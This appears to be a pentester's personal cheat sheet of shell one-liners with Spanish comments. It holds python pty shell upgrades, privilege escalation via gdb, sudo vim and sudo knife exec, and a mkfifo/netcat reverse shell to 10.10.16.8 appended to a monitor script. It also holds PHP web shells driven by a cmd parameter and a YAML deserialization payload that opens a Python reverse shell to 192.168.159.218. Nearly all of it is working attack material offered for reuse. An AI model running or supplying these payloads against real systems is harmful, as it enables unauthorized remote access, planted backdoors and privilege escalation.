```zsh
# este comando se ralla con vim
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
/bin/gdb -nx -ex 'python import os; os.execl("/bin/sh", "bash", "-p")' -ex quit
#privesc
sudo vim
:!sh or :!bash
```
unified - terminal
```
script /dev/null -c bash

export TERM=xterm-256color
stty sane
```

```bash
sudo /usr/bin/knife exec -E 'system("/bin/bash")'

echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.8 33 >/tmp/f' | tee -a monitor.sh
```
php
```
<?php echo system($_GET['cmd']); ?>
echo '<?php system($_GET["cmd"]); ?>' > web_shell.php
system($_GET['cmd']);

/?p=6&cmd=id
$resultado = system($_GET['cmd']);
<h1 class="page-title"><?= $resultado ?></h1>
```
yaml - exploit
```bash
- !!python/object/apply:subprocess.Popen
  - ["python3", "-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.159.218',333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/sh')"]
```

```bash
python3 -m venv venv 
source venv/bin/activate 
pip install pycryptodome
#command to exit
deactivate
```

```
dpkg -l | grep -i polkit
```


